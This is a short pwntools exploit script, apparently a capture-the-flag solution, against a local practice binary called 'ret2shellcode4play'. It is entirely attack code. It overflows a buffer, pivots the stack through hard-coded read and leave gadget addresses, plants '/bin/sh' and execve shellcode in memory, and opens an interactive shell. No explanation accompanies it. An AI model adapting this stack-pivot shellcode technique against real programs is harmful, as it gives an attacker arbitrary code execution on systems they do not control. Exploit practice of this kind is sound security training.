from pwn import *
context(os='linux', arch='amd64', log_level='debug')

io = process('./ret2shellcode4play')

buf = 0x123456789500
buf_1 = 0x1234567894b0
leave = 0x4006cc
read = 0x4006b1
shellcode = b'0\xd21\xf6H\xbf\xf0\x94xV4\x12\x00\x00\xb0;\x0f\x05'

io.recv()

payload = b'a' * 0x10 + p64(buf) + p64(read)
io.send(payload)

payload = b'/bin/sh\x00' + p64(0) + p64(buf_1) + p64(read)
io.send(payload)

payload = shellcode.ljust(0x18, b'\x00') + p64(buf_1 - 0x10)
io.send(payload)

io.interactive()

